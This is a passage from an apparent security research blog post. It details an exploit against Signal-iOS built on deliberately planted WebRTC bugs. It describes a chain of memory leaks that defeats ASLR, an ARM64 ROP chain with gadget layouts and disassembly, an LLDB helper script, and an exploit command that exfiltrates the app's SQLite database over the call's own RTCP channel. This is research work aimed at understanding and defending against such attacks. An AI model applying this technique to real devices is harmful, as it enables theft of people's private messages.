methods in virtual method tables (vtables), which are essentially arrays of function pointers. Class instances generally reference their vtable in their allocation’s first eight bytes. Leaking this address leaks the WebRTC library's __const segment for WebRTC-defined classes. With a WebRTC __const address we can calculate WebRTC 's base address.For the remainder of this post, WebRTC stylized as code refers to the compiled library loaded into process memory rather than the overarching code base.So now we need to bridge from WebRTC to the shared cache. Scrolling through WebRTC imports, we see that WebRTC relies upon Objective-C functionality from the  Foundation library. This can be confirmed statically in IDA by investigating the __objc_classrefs section:Fig 1: IDA screenshot of WebRTC 's __objc_classrefs section, showing Objective-C class imports.Reading the value at these symbols leaks a Foundation address in the shared cache and reveals the shared cache’s slide. This breaks ASLR for the entire shared cache, including the address for _NXArgv! Therefore, our strategy for leaking the program stack is as follows:Leak *RTCPReceiver, which is a Clock* clock_ objectLeak *clock_, which is the child RealTimeClock class’s vtable pointer to a WebRTC __const addressCalculate WebRTC's base address using the leaked vtable addressCalculate the address of __objc_classrefs in WebRTCLeak the _OBJC_CLASS_$_NSString value, which points to the Foundation libraryCalculate the shared cache slide using Foundation’s offset in the target iOS version's shared cache Calculate the address of _NXArgv in libdyld.dylib using the shared cache slideLeak the main thread’s stack address stored in _NXArgvNote: see the Limitations of the Simulator section to understand why this does not work on the iOS simulator.Not bad! But you may notice that this stack address is not the address where we want to hijack execution—in fact, we have not yet determined what that address is. We need to investigate the program's state when triggering our vulnerabilities to define this target address.Our memcpy occurs in RTCPReceiver::ParseCompoundPacket. To begin our ROP chain, we must clobber this function’s stack frame or one of the calling function’s frames. How do we know the offset between the leaked _NXArgv stack address and the target frames? Is that offset even constant?We need to make and confirm some assumptions to answer this question. First, it is important to note _NXArgv always leaks the main thread's stack but our packet is handled on a completely different thread! WebRTC has three primary threads which are spawned by the RTCPeerConnectionFactory for individual and group calls:// webrtc/sdk/objc/api/peerconnection/RTCPeerConnectionFactory.mm - (instancetype)initNative { if (self = [super init]) {  _networkThread = rtc::Thread::CreateWithSocketServer();  _networkThread->SetName(""network_thread"", _networkThread.get());  BOOL result = _networkThread->Start();  RTC_DCHECK(result) << ""Failed to start network thread."";  _workerThread = rtc::Thread::Create();  _workerThread->SetName(""worker_thread"", _workerThread.get());  result = _workerThread->Start();  RTC_DCHECK(result) << ""Failed to start worker thread."";  _signalingThread = rtc::Thread::Create();  _signalingThread->SetName(""signaling_thread"", _signalingThread.get());  result = _signalingThread->Start();  RTC_DCHECK(result) << ""Failed to start signaling thread.""; } return self; } Setting a breakpoint on ParseCompoundPacket and sending our trigger.py payload shows that packet handling is done on the worker thread.Fig 2: Xcode stack trace for a breakpoint at webrtc::RTCPReceiver::ParseCompoundPacket showing handling on the worker thread.Is the worker thread's stack some fixed distance from the main thread's stack? Let’s test by hooking execution with an LLDB script in Xcode that computes and compares the top of each stack:import lldb # load in lldb with `command script import <path to stack_comparison.py> # run in lldb with `compare_stacks` after the app spawns def __lldb_init_module(debugger, internal_dict): debugger.HandleCommand(""command script add -f stack_comparison.compare_stacks compare_stacks"") def compare_stacks(debugger, command, result, internal_dict):  target = debugger.GetSelectedTarget()  if not target:   result.PutCString(""No target Selected. "")   return  process = target.GetProcess()  if not process:   result.PutCString(""No process running. "")   return  dump_frame_pointers(process) def dump_frame_pointers(process):  threads = process.get_process_thread_list()  # dict of {""TID"": [""thread name"", top_of_stack_addr]}  thread_stacks = dict()  for t in threads:   f = t.GetNumFrames()   tid = str(t.GetIndexID())   name = t.GetName()   if name is None and tid == ""1"":    name = ""main""   for i in range(f):    fp = t.GetFrameAtIndex(i).GetFP()    if not tid in thread_stacks:     thread_stacks[tid] = (name, fp)    elif thread_stacks[tid][1] < fp:     thread_stacks[tid] = (name, fp)  thread_stacks = {k: v for k, v in sorted(thread_stacks.items(), key=lambda item: item[1][1])}  for (k, v) in thread_stacks.items():   if v[0] is None:    continue   print(""{:08x}: {} - {}"".format(v[1] - thread_stacks[""1""][1], v[0], thread_stacks[""1""][0])) And what we find is really interesting. Spawned threads stacks exist at a higher addresses than the main stack, and the offsets remain constant.00000000: main - main 0022ba00: com.apple.uikit.eventfetch-thread - main 0045ba00: AXSpeech - main 00667a00: tokio-runtime-worker - main 00873a00: tokio-runtime-worker - main 00a7fa00: tokio-runtime-worker - main 00c8ba00: tokio-runtime-worker - main 00e97a00: tokio-runtime-worker - main 010a3a00: tokio-runtime-worker - main 0112fa00: network_thread 0x0x2805d05a0 - main 011bba00: worker_thread 0x0x2805d0780 - main 01247a00: signaling_thread 0x0x2805d0870 - main 01453a00: call-manager-worker - main 01c3fa00: com.apple.CFSocket.private - main 01ccba00: com.apple.NSURLConnectionLoader - main ... The offsets may be different than above between iOS and Signal-iOS versions, but the offset values should remain consistent across runs.Running a handful of times shows that the worker_thread stack is 0x11bba00 bytes higher than the main thread stack. This is great news, as the _NXArgv leak also breaks randomization for the WebRTC thread stacks! We decide to hijack control at the return from RTCPReceiver::IncomingPacket, the function which calls the vulnerable ParseCompoundPacket function. We can set a breakpoint on that function and easily calculate the exact offset from its pushed lr pointer to the leaked _NXArgv address.It is worth noting that we observed occasional exceptions to this conclusion. Every so often, the WebRTC threads shift 0x8c000 bytes (together) up or down. Presumably, this is due to a race condition in thread spawning, though we did not extensively analyze the root cause. As shown above, the worker_thread is always sandwiched 0x8c000 bytes above the network_thread and 0x8c000 bytes below the signaling_thread. To compensate for the occasional incorrect offset, we simply adapted our script to perform an arbitrary read at the target overwrite address and compare the retrieved value against the expected lr value. If it matches, the script continues. If it does not then the exploit shifts the target read 0x8c000 bytes up or down and performs the comparison again. In the event neither shift matches, the exploit terminates rather than sending an incorrect address, which would crash the process.Identifying a GoalAt this point, we have a strategy to leak a handful of addresses so that we can copy an arbitrary payload onto the stack, thereby hijacking execution when a pushed lr is loaded. So the next question is: what do we want to do with this power?We thought it would be fun to exfiltrate some data. A perfect target for this is the on-device Signal database.Signal-iOS Pods dependencies include the GRDB toolkit which manages the Signal-iOS SQLite database. The DatabasePool class is responsible for this, though Signal-iOS wraps this in multiple layers of abstraction. One of these layers is the GRDBDatabaseStorageAdapter class in the SignalServiceKit (SSK) library. GRDBDatabaseStorageAdapter contains an NSURL databaseFileUrl which stores the file path to the database. We can use this information to identify the Signal database path with a simple LLDB script. Load the app, click around a bit, load the script, and click around some more to trigger a database access. The script output should show a path of the form:file:///Users/<user>/Library/Developer/CoreSimulator/Devices/0B0A733F-9AB5-4062-8E88-032F2CC0534F/data/Containers/Shared/AppGroup/C87E0E7A-BB36-4E21-9E11-CC9886269EF3/grdb/signal.sqliteif the target is running in the Xcode Simulator, or:file:///private/var/mobile/Containers/Shared/AppGroup/CF920F33-AB4B-41F3-A88E-1146DF8857EE/grdb/signal.sqlite if targeting a jailbroken device.That’s great! However that app group UUID is concerning. To make this exploit reliable we need a way to resolve the it, and we do not have access to the GRDBDatabaseStorageAdapter instance to look up this path remotely like we did in the LLDB script.More Leaks: Leaking the Database PathAt this point it is worth taking a step back and thinking philosophically about how Signal uses the database. Surely it is already open in memory, because opening and closing the database for every transaction is unrealistic. Furthermore, it is likely there is some global state variable with a handle to the open database for easy access. After some digging, it turns out the SignalServiceKit has a gigantic SSKEnvironment class with handles to important state classes and queues. Included is a databaseStorageRef: SDSDatabaseStorage reference to yet another database abstraction. SDSDatabaseStorage has a member variable, grdbStorage: GRDBDatabaseStorageAdapter which contains a URL holding the database path on disk.We can use this traversal plus the philosophy included in the LLDB script linked above to leak the database path:SSKEnvironment instance->grdbStorage->databaseFileUrl->url NSString->filepath char* Our target is now the SSKEnvironment instance to begin this chain. This class defines a _shared property for shared access, and there is a  SSKEnvironment.shared.getter function in the SignalServiceKit library. Let's open this in IDA to see where this shared object resides in memory.__int64 static SSKEnvironment.shared.getter() { int *v0; // x19 int *v1; // x0 __int64 result; // x0 if ( one-time initialization token for _shared != -1 )  result = swift_once(&one-time initialization token for _shared, one-time initialization function for _shared); v0 = static SSKEnvironment._shared[0]; if ( static SSKEnvironment._shared[0] ) {  v1 = objc_retain(static SSKEnvironment._shared[0]);  return (__int64)v0; } else {  __break(1u); } return result; }Following the SSKEnvironment._shared[0] cross-reference shows a global SSKEnvironment instance stored in the library's __data segment!__data:000000000104AEF0 ; static SignalServiceKit.SSKEnvironment.(_shared in _EEC8B08E64177A87B63E94E9361FDCEA) : SignalServiceKit.SSKEnvironment? __data:000000000104AEF0 _$s16SignalServiceKit14SSKEnvironmentC7_shared33_EEC8B08E64177A87B63E94E9361FDCEALLACSgvpZ DCQ dword_0 Unfortunately we have not yet broken ASLR for the SignalServiceKit library.Again, taking a step back, we can theorize that the main Signal binary has some imports to SSK functions or variables. Sure enough, there are references to SSKEnvironment.shared.getter and a variety of other SSK functions in Signal’s Global Offset Table (GOT). GOT symbols are unfortunately not exported, so tools like nm and ipsw do not resolve their addresses easily. Instead, we can parse the disassembly for calls to the target function and manually follow a call to the GOT stub function that fetches the GOT address:Find the address of a function that calls some SSKEnvironment functions, like static (extension in Signal):SignalServiceKit.OWSSyncManager.shared.getter : SignalServiceKit.OWSSyncManagerFind a call to a stub function in the __stubs segment, such as type metadata accessor for SignalServiceKit.SSKEnvironmentFind the GOT address loaded into x16 in the stubRead that address using the leak primitive to leak a SignalServiceKit addressBreaking randomization for the SignalServiceKit library allows us to find the SSKEnvironment global variable's address and the instance it stores. We are then free to leak database object and URL to fingerprint the SQLite database path on the device!The Final LeaksWe have leaked a lot of valuable information, but we are unfortunately not done quite yet. The database leak depends upon having a Signal binary address, but as of yet we only have WebRTC and the shared cache. How do we bridge what we have to Signal?The shared cache contains core libraries responsible for bootstrapping apps, so it stands to reason there is a reference to the Signal binary somewhere. Let’s start by investigating how an app is initialized at runtime. iOS apps have a main.swift or main.m file defining their entry point. This file includes a call to UIApplicationMain which creates the app's overarching UIApplication instance. The following is Signal’s main.m file:int main(int argc, char *argv[]) {  NSString *appDelegateName;  @autoreleasepool {   // Any setup work pre-UIApplicationMain() should be placed   // inside this autoreleasepool.   appDelegateName = NSStringFromClass(AppDelegate.class);  }  // UIApplicationMain is intentionally called outside of the above  // autoreleasepool. The function never returns, so its parent  // autoreleasepool will never be drained.  return UIApplicationMain(argc, argv, nil, appDelegateName); } The third argument is a principalClassName for specifying a custom UIApplication class. Signal chooses nil for this argument, meaning it will default to the generic UIApplication class. This instance is shared and accessible via the global _UIApp variable in the UIKitCore shared cache library. This is all rather boiler-plate.Next, the UIApplication must instantiate a delegate: UIApplicationDelegate, which in this case is Signal-specific. Somewhat similar to C++ objects, Swift (Objective-C) objects maintain inheritance through an ISA property. Because the delegate is defined in Signal’s code, its ISA points to its meta-class in the Signal binary!Putting it all together, we can obtain a Signal address, then a SignalServiceKit address, then the database file path through a series of leaks once we have the shared cache slide:With the shared cache slide, calculate the _UIApp global address in UIKitCoreLeak the UIApplication instanceLeak the UIApplicationDelegate instance from the UIApplication's delegate member variableLeak the first eight bytes at the delegate, which is the ISA pointer to the meta classApply the ISA address mask (0x0000000ffffffff8) to the pointer to get the instance addressLeak the delegate's meta-class in the Signal binary and compute Signal's base addressLeak an imported SignalServiceKit function address from Signal’s GOT and compute the global SSKEnvironment addressLeak the SSKEnvironment instanceLeak the databaseStorage member variableLeak the databaseFileUrl member variableLeak the NSURL’s NSMutableString parameterLeak the character string for the file (chopping off the URL-prepended file:// to leave just the file path)Let’s take a moment to appreciate this—we use a single WebRTC object address (on one of the iOS heaps) to break ASLR for the WebRTC shared library, all shared cache libraries, the SignalServiceKit shared library, the Signal binary, and the process stack. In turn, we also leak the address of Signal’s SQLite database on disk and a target lr on the worker thread's stack. That’s pretty cool! But we cannot rest just yet - we now need a strategy to exfiltrate the database’s data. Fig 3: The chain of leaks from the RtcpReceiver object to the target addresses.It is worth noting here as to why we jump through extra hoops to leak the database file path when we know it is open in memory. We decided against using the opened database to avoid any issues with synchronous access from other threads and potential side effects of moving the existing file handle. It is also worth noting that the ROP chain could use fcntl to find the database path from an open descriptor; testing showed it is frequently open in fd 7, but occasionally ends up in fd 8. Looping in ROP chains is not fun (we will see that later on) and makes the payload quite lengthy, so the extra couple of leaks here are worth it.Leveraging the Encrypted TransportOur eight-byte arbitrary read won’t cut it when it comes to leaking database data back to our attacking phone. Luckily, we have a fully-encrypted communication channel already established and at our disposal! We currently have a leaked RTCPReciever instance, but that class is only responsible for handling received packets. However, its member ModuleRtpRtcp* const rtp_rtcp_ is a reference to the overarching RTP/RTCP interface and is a ModuleRtpRtcpImpl2 instance. This class maintains an RTCPSender object, which is exactly what we want! Specifically, we want a handle to the overarching MediaChannelUtil transport used to send packets. Our target is a call to MediaChannelUtil::TransportForMediaChannels::SendRtcp, which takes a simple vector-like rtc::ArrayView of data and queues an outgoing packet after passing it to the SRTP Transport layer for encryption. This is perfect for our use case—if we open and read the database into a new mmapped region, we can iterate through the buffer and queue a series of outgoing packets on the same connection. We can also pretty trivially leak the required instances:RTCPReciver instance->rtp_rtcp_->rtcp_sender_->transport_ And we already have the base WebRTC library address so finding MediaChannelUtil::TransportForMediaChannels::SendRtcp is as easy as adding its offset (we can also leak it through the TransportForMediaChannels instance’s vtable if needed).This strategy sets us up for RCE and database exfiltration. But we have a problem with our current research environment, and it’s worth tackling that now before going any further.Limitations of the SimulatorThe iOS simulator proved useful for our initial exploit testing when targeting the WebRTC binary using a WebRTC leak. Our next step in the leak chain is to leak a Foundation address using WebRTC’s imports, which does works. But after that, we fail to pivot to libdyld.dylib and _NXArgv in the shared cache. The root of the issue is the iOS Simulator and its inherent research limitations.It comes down to the difference between a simulator and an emulator. A simulator does what it sounds like—simulates behavior but does not necessarily replicate it. This is fine for iOS development—as long as the app under development can interact with the shared cache APIs, it does not require perfect device replication. Conversely, an emulator strives for replication of an environment down to some level of granularity; it will never be the “exact” environment it emulates, but it wants to be as close as possible.One shortcut the iOS Simulator takes is it does not implement the shared cache for the iOS version under simulation. Rather, it downloads individual binaries that are relevant for app development and stores them individually on the host filesystem. Presumably, this is because the shared cache contains a ton of added functionality that is critical for certain on-device processes but irrelevant for third-party app development.We can confirm this by tracing the path of a loaded image using image list <image name> in the Xcode debugger. For iOS 17.2 (21C62), the path to Foundation is /Library/Developer/CoreSimulator/Volumes/iOS_21C62/Library/Developer/CoreSimulator/Profiles/Runtimes/iOS\ 17.2.simruntime/Contents/Resources/RuntimeRoot/System/Library/Frameworks/Foundation.framework/Foundation, meanwhile the path for libdyld.dylib is /Library/Developer/CoreSimulator/Volumes/iOS_21C62/Library/Developer/CoreSimulator/Profiles/Runtimes/iOS 17.2.simruntime/Contents/Resources/RuntimeRoot/usr/lib/system/libdyld.dylib. This clearly shows that the simulator breaks up the core shared cache libraries into separate images on the host’s disk.But the problem is not necessarily that the simulator splits the shared cache into multiple binaries—at the end of the day, the shared cache ipsw file is a bundle of individual images anyway. The issue is that on a real device these images are slid together so that leaking a single address in a single image breaks ASLR for all images. If the simulator mimicked this behavior, we would expect to see the relative offset between simulator-loaded cached libraries match the iOS version’s ipsw file.The ipsw tool helps us find these expected offsets. For example, the offset between Foundation and libdyld.dylib for iOS version 17.2 running on the iPhone 15 Pro (our simulator device) can be found with these commands:$ ipsw download --device iPhone15,4 --build 21C62 ipsw $ ipsw extract --dyld iPhone15,4_17.2_21C62_Restore.ipsw $ cd 21C62__iPhone15,4 $ ipsw dyld macho -l dyld_shared_cache_arm64e Foundation | head -n 6 Magic   = 64-bit MachO Type   = DYLIB CPU   = AARCH64, ARM64e caps: USR00 Commands  = 41 (Size: 7960) Flags   = NoUndefs, DyldLink, TwoLevel, WeakDefines, BindsToWeak, AppExtensionSafe, DylibInCache 000: LC_SEGMENT_64 sz=0x00b60000 off=0x00074000-0x00bd4000 addr=0x186d34000-0x187894000 r-x/r-x __TEXT $ ipsw dyld macho -l dyld_shared_cache_arm64e libdyld.dylib | head -n 6 Magic   = 64-bit MachO Type   = DYLIB CPU   = AARCH64, ARM64e caps: USR00 Commands  = 27 (Size: 2896) Flags   = NoUndefs, DyldLink, TwoLevel, NoReexportedDylibs, AppExtensionSafe, DylibInCache 000: LC_SEGMENT_64 sz=0x00027ff8 off=0x060e8000-0x0610fff8 addr=0x1adbc4000-0x1adbebff8 r-x/r-x __TEXT The start of the addr field in each macho command are used to to calculate the offset between the two libraries: 0x1adbc4000-0x186d34000=0x26e90000. Comparing with the simulator, Xcode shows the following mappings:(lldb) image list Foundation [ 0] 03B66A9F-BE07-39EF-812D-EA7D8B87F7EB 0x0000000180797000 /Library/Developer/CoreSimulator/Volumes/iOS_21C62/Library/Developer/CoreSimulator/Profiles/Runtimes/iOS 17.2.simruntime/Contents/Resources/RuntimeRoot/System/Library/Frameworks/Foundation.framework/Foundation (lldb) image list libdyld.dylib [ 0] A8A57482-5D24-3787-8776-DE959BFA77D7 0x0000000180295000 /Library/Developer/CoreSimulator/Volumes/iOS_21C62/Library/Developer/CoreSimulator/Profiles/Runtimes/iOS 17.2.simruntime/Contents/Resources/RuntimeRoot/usr/lib/system/libdyld.dylib This resolves to an offset of 0xffffffffffafe000, which is clearly not right. This shows the individual binaries are slid independently with no regard for the relative offsets expected on a real device.This is a problem for our research, because it fundamentally breaks a runtime assumption needed to chain our leaks together. To solve this, we need an emulator or jailbroken device.Leveraging the Corellium EmulatorThe following sections continue research by mimicking real-world devices using the Corellium emulator and a signed, archived Signal-iOS app. This requires a Corellium user account for the virtualized device and Apple Developer account to sign the modified Signal binary. If you are following along and neither are available to you, you can either jailbreak an iPhone (not covered in this blog) or extend the leak primitive to provide other library addresses that would otherwise be chained together.Corellium offers emulation solutions for iOS and Android by providing a virtual jailbroken devices. Set-up is extremely easy and provides a variety of device and firmware versions to replicate the exact target environment.Fig 4: Choosing our target iOS firmware on Corellium.Next we must install Signal on the device. Per Corellium’s documentation, we need an unencrypted and signed app. This requires signing and archiving (with a valid Apple Developer account) our Signal-iOS project. We also need to tweak our repo by removing some of the entitlements that we do not have access to, because we are not part of the Signal org! This is fine for the sake of our research since these entitlements do not affect the functionality of our exploit and we are not actually deploying this app in production.Remove the following entitlements from the Signal, SignalShareExtensions and SignalNSE targets (in the Project Navigator pane, click on the main Signal project -> Signing and Capabilites, and choose each target):Apple PayCommunication NotificationsData ProtectionWe must also update the SIGNAL_BUNDLEID_PREFIX in the project’s Build Settings tab to reflect our own company/entity, since we are not part of Signal’s org.whispersystems. We are now free to change the Team to our own Apple Developer account in the Signing and Capabilities tab. This change is only required for non-App Store Release configurations, because we are definitely not releasing this modified app to the App Store!Fig 5: Changing the developer Team from org.whispersystems to the company/user affiliated with our Apple Developer account.Finally, we change Signal’s build configuration scheme for archiving, from App Store Release to Testable Release.Fig 6: Changing the Signal app's Archive options to Testable Release.Now we can archive (Product -> Archive) with the target as Any iOS Device (arm64) to compile a .ipa file for installation. Make sure to select the Debugging distribution as the final output, since this configuration allows us to attach Xcode to Corellium for testing. Installation on our Corellium device is as simple as dragging and dropping the output .ipa into Corellium’s Apps pane.After installation in Corellium, make sure to change the following app settings on-device otherwise the app will hang after submitting the registration verification code:Disable notifications in Settings -> SignalDisable background app refresh for Signal in General -> Background App RefreshIt is extremely useful to hook up our Xcode debugger to the remote app for exploit development and testing. We can do this using Corellium’s USBFlux utility. Simply follow the instructions and Xcode should recognize the remote device as a target run destination! We can then boot Signal on the virtual device and connect our Xcode debugger to it using Debug ->Attach to Process by PID or Name....We are finally ready to assemble our exploit and achieve RCE on the emulated device.ROPing in RTCBefore we discuss our specific ROP chain, it is worth understanding ROP in ARM64 more generally. Those familiar with x64 ROP chains know that control is gained and maintained by popping a controlled value into RIP using the ret instruction. So long as we have control of the stack and use gadgets that end with a ret we can pop the next gadget into the instruction pointer. ARM64, and specifically iOS, work a bit differently. ARM has a link register, lr (also named x30) that stores the return address for a given function frame. Like x64 it is pushed onto the stack during the function prologue.sub sp, sp, #0x50 stp x24, x23, [sp, #0x10] stp x22, x21, [sp, #0x20] stp x20, x19, [sp, #0x30] stp x29, x30, [sp, #0x40] Unlike x64, the ret instruction (or retab instruction when dealing with iOS PAC instructions, see below) simply moves lr into pc - it does not pop a value off the stack. Instead, lr is loaded (along with the pushed frame pointer, fp, a.k.a. x29) with the ldp instruction in a function epilogue:ldp x29, x30, [sp, #0x40] ldp x20, x19, [sp, #0x30] ldp x22, x21, [sp, #0x20] ldp x24, x23, [sp, #0x10] add sp, sp, #0x50 retab Note that ROP on iOS is dependent upon whether the application supports Pointer Authentication Codes (PAC). The arm64e architecture includes PAC instructions which protect against exploit strategies like ROP. In this case, instructions which push addresses also sign the pointer with a unique key. Instructions that load this data validate the signature, triggering an error if the validation fails. To bypass PAC we would need to forge signed pointers through the use of signing gadgets, which are frequently removed. Thankfully, this is not needed because PAC is only enabled for iOS native apps (Safari, iMessage, etc.) and not third-party apps like Signal. The shared cache is compiled for arm64e, however we can treat the PAC instructions as their non-PAC counterparts with a no-op for signing and validating.To continue execution control we must search for gadgets prior to a ret/retab instruction and spoof the expected stack frame so that our next gadget address resides at sp + X - 8 (where X is the constant in add sp, sp, #X or ldp x29, x30, [sp] #X; 0x50 in the above example). This unfortunately means our ROP gadgets take up more space in a payload than the average x64 gadget. That said, they may provide control to a couple other registers; the gadget shown above allows us to control the values for x19-x24 in addition to fp and lr as we exit the frame. We leverage this a lot in our constructed chain, specifically controlling x19 and x20 because they are commonly used to set other registers. This is the primary gadget layout we’ll use in our payload.Fig 7: Generic arm64 ROP gadget layout showing the spoofed stack frame, including the next gadget's address at an offset from X - 8 from the current stack pointer (where X is the stack frame size).Gadgets are unfortunately few and far between for manipulating certain registers, specifically x4 and x5. Another way of maintaining control is through blr gadgets, or blraaz (PAC instruction) gadgets in the shared cache. This opens up more possibilities so long as we can control the register responsible for branching.mov	x5, #0 ldr	x6, [sp] blraaz	x6 The only consideration with these gadgets is that they do not adjust the stack, so the gadget jumped to must load the next lr from an offset that does not conflict with the blr gadget's ldr/ldp instructions. For the blraaz gadget above (gadget 0) followed by two generic ROP gadgets (gadget 1, 2), we have the following layout in our payload:Fig 8: Branch and link ROP gadget layout, showing a transition from the blraaz gadget (gadget 0) which jumps to the address pointed to by the current sp. sp is not updated during the branch, meaning the execution of the next gadget (gadget 1) loads the subsequent gadget (gadget 2) from an offset based on its (gadget 1's) stack frame size.We also need a strategy for jumping sp to an address we control. This is useful for pivoting from a stub ROP chain to a longer chain or creating conditional loops in our chain. For this we’ll use a sub sp, x29, #Z gadget. We set x29 as we exit the prior gadget and that value is immediately used to calculate a new sp of our choosing:sub	sp, x29, #0x10 ldp	x29, x30, [sp, #0x10] ldp	x20, x19, [sp], #0x20 retab Fig 9: Stack pivot ROP gadget layout showing that the prior gadget updates x29 as it exits its frame to a destination of our choice, destired sp + #Z. Entering the sub sp, x29, #Z gadget adjusts sp to our destination address. If the new address contains a ROP gadget frame, control continues.Our final consideration is how to handle function calls, such as SendRtcp or system calls like open. To continue control we cannot simply jump into the function at its entry. If we do so the prologue will store the existing lr—which points to the function entry—on the stack. The epilogue then loads the pushed lr and moves it into pc, resulting in an endless loop within the same function.Instead, we can jump past the prologue and spoof the stack frame that the prologue would have created. So long as our next gadget’s address resides at the offset expected in the epilogue, we maintain control!; cricket::MediaChannelUtil::TransportForMediaChannels::SendRtcp(int, int, unsigned __int64) SUB    SP, SP, #0xE0 STP    X22, X21, [SP,#0xD0+var_20] STP    X20, X19, [SP,#0xD0+var_10] STP    X29, X30, [SP,#0xD0+var_s0] ADD    X29, SP, #0xD0 MOV    X19, X2 ; JUMP HERE!!!! STACK FRAME IS SET ABOVE MOV    X21, X1 MOV    X20, X0 MOV    X8, #0xAAAAAAAAAAAAAAAA STP    X8, X8, [SP,#0xD0+var_B0] ; ... ADD    X0, X22, #8 ; this BL    __ZN3rtc17CopyOnWriteBufferD1Ev ; rtc::CopyOnWriteBuffer::~CopyOnWriteBuffer() MOV    W0, #1 ; LOAD VALUES FROM OUR SPOOFED FRAME HERE! LDP    X29, X30, [SP,#0xD0+var_s0] LDP    X20, X19, [SP,#0xD0+var_10] LDP    X22, X21, [SP,#0xD0+var_20] ADD    SP, SP, #0xE0 RETLaying out the ROP ChainOnce we hijack pc we need a plan of attack for our ROP chain. Let's quickly summarize where we are at and the techniques at our disposal.We can hijack the instruction pointer by overwriting the pushed lr in RTCPReceiver::IncomingPacket’s stack frame on the worker thread's stack. We can store any data we want elsewhere on the worker thread's stack for later use (since we know the stack's address range), which is very useful for fetching, manipulating, and storing data. We can easily get the address of our payload on the heap as explained below. We have the address pointing to the database path. We have a sending transport object and the address of its SendRtcp function.Assuming we can locate our buffer in memory, our first decision is whether to copy our entire ROP chain onto the stack or pivot to our buffer. We could do the former, but let’s practice stack pivoting in ARM and only copy a minimal payload that pivots sp to our data buffer.Our plan, at a high level, is as follows:Pivot the stack to a longer ROP chain in our payloadOpen and read the database into memoryCreate a spoofed stack frame on the worker thread's stack for the call to SendRtcp. This function calls various sub-functions that clobber data below the stack pointer. We will jump sp to the worker thread's stack for this call and jump it back after, thereby protecting our ROP payload (and loops) from being clobberedIterate through the database data, calling SendRtcp to exfiltrate chunks of dataLoop infinitely once we’re finished. We need this thread to stay alive so Signal can context switch to the network thread and send our queued packets. Restoring system state to pre-hijack conditions is tedious. Instead, if we jump to a retab instruction without updating lr, lr continues to point at the retab instruction. Voilà, infinite loop!So, how much data can we send back at a time? There is a constraint on the maximum DTLS packet length of 2048 bytes, limiting outgoing packets to slightly less than that after consideration of transport headers. This is also a limitation on our payload since it is sent with RTCP via the DTLS transport. 2048 bytes seems like a lot of data, but spoofing stack frames quickly eats up that space if we are not careful. Let’s plan out a ROP chain that reuses gadget sections as much as possible to save on space, based on our above plan.Notations PUSHED_LR, RTCP_CALL, etc. in the images below refer to constant offsets defined in the exploit script.Fig 10: The first part of the ROP chain exploit, parts (a) - (d).Part (a): Small ROP payload copied to the stack to pivot sp to (b)Part (b): Store the address of the transport object to scratch space on the worker thread's stack so it can be easily fetched later before the SendRtcp callPart (c): Open a new file handle to the database and read its contents into memory using mmap with the returned fdPart (d): Store the database data pointer and a counter (initialized to 0) on the stack for use in the SendRtcp callFig 11: The looping payload steps. This involves parts (e) through (i) but skips part (f) on the first iteration.Part (e): Jump to (g) (skip increment)Part (f): Fetch the database data pointer and counter from the stack's scratch space. Increment the counter, advance the buffer by 1984 bytes, and store the updated values back on the stack. Skipped in first iterationPart (g): Load the counter and compare against some predefined limit. Store a chosen address on the stack at the bottom of a spoofed function frame depending on the result of a comparison: if the counter is less than the limit, store the address of SendRtcp; if equal, store address of a retab instructionPart (h): Store a return fp and lr into the spoofed SendRtcp function frame on the stack where the epilogue expects themPart (i) - pivot the stack by jumping to the bottom of the spoofed SendRtcp stack frame. This loads a pushed lr that either calls SendRtcp to queue a packet with exfiltrated data, or an infinite retab if we reached our limit in (g)'s comparisonFig 12: The return from the call to SendRtcp, which pivots the stack back to part (f) to increment our exfiltrated data counter and buffer pointer. This loop continues until the limit is reached, in which case the retab gadget causes an infinite loop.The SendRtcp epilogue loads fp and lr pointing to a sub sp, x29 gadget. We strategically store an x29 that points to part (f) to increment the data pointer and counter and loop to send the next packet. Eventually we reach our exfiltration limit and a retab gadget is stored on the worker thread's stack, tying up the worker thread in an infinite loopOur puzzle is finally taking shape! The only remaining piece is finding our buffer address so we can dynamically calculate offsets into our ROP chain. Our exploit targets the pushed return pointer for webrtc::RTCPReceiver::IncomingPacket. Disassembly of its call to ParseCompoundPacket(rtc::ArrayView<uchar const>,webrtc::RTCPReceiver::PacketInformation *) shows that the payload address is in x21 (x0 is this, and the ArrayView is broken into the byte buffer (x1) and the length (x2)):; webrtc::RTCPReceiver::IncomingPacket(rtc::ArrayView<unsigned char const, -4711l>) ; ... ; ADD    X3, SP, #0x1F0+__dst MOV    X0, X19 MOV    X1, X21 MOV    X2, X20 BL    __ZN6webrtc12RTCPReceiver19ParseCompoundPacketEN3rtc9ArrayViewIKhLln4711EEEPNS0_17PacketInformationE ; webrtc::RTCPReceiver::ParseCompoundPacket(rtc::ArrayView<uchar const,-4711l>,webrtc::RTCPReceiver::PacketInformation *) CBZ    W0, loc_21DF74 We start our ROP chain with mov x0, x21 followed by stp x0, [x19] to store the heap buffer address in our stack scratch space for future reference, and then we continue with the ROP chain outlined above!We chose all our ROP gadgets from the target iOS's shared cache and stored information about their layout in gadgets.json. Adjustment to a different target iOS version requires finding offsets for gadgets with identical functionality in the new version. The exploit script accepts a custom gadgets.json file using its -g command line flag to facilitate targeting different versions.Achieving RCEWith our ROP chain assembled, Signal-iOS app target running in Corellium, and thrower device booted with Frida, we are ready to throw our exploit! Simply input the target phone number and emulator name in the command below:cd frida_scripts python3 exploit.py -l call.js,exploit.js -n 15555555555 -D emulator-XXX \  -c ~/Documents/iPhone15,2_16.4_20E247_Restore.ipsw -s ~/Documents/Signal.ipa \  -g ./gadgets.json And we successfully receive the (encrypted) database data on our throwing device!      0:00 /1:04 1×    Video 1: Landing the POC exploit script against the Corellium target. After the exploit finishes, the call is left to timeout on the target to demonstrate that the Signal app is still able to send messages. Next StepsWe completed our exploit and achieved the goal of leaking Signal-iOS's database using the synthetic WebRTC bugs. Along the way we discovered how to break ASLR for Signal and a variety of shared libraries, learned how to use and debug exploits in Corellium, and constructed a complex ARM64 ROP chain.In our final post in this series, we discuss the practicality and limitations of this exploit from an offensive perspective. We also investigate the indicators of compromise (IOCs) and detection strategies when viewed from a defensive lens. Stay tuned for more!    Share this article:     Subscribe      About Services Resources Blog        Margin Research, LLC New York, NY ©2024 Margin Research. All Rights Reserved.         "
